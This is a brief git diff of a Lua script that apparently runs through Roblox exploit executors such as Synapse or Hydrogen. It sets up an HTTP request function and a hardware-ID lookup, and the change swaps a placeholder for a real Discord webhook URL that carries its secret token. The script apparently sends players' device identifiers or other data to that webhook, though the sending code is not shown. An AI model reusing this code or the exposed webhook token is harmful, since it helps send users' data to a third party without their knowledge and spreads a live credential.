@@ -7,7 +7,7 @@ wait(0.1)
 local request = (http and http.request) or (syn and syn.request)
 local gethwid = gethwid or identifyexecutor -- si estás usando Synapse/Hydrogen, esto funciona
 
-local hook = "AQUI_TU_WEBHOOK" -- 🔗 pega tu webhook real aquí
+local hook = "https://discord.com/api/webhooks/1393311704452042912/9o5Z4KndxGdTRQ0wA8RbQXQbW6Ih3TEfBwd4wgobi7-K7IE5qD7-WpkH26_s8x8qVzXS" -- 🔗 pega tu webhook real aquí
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
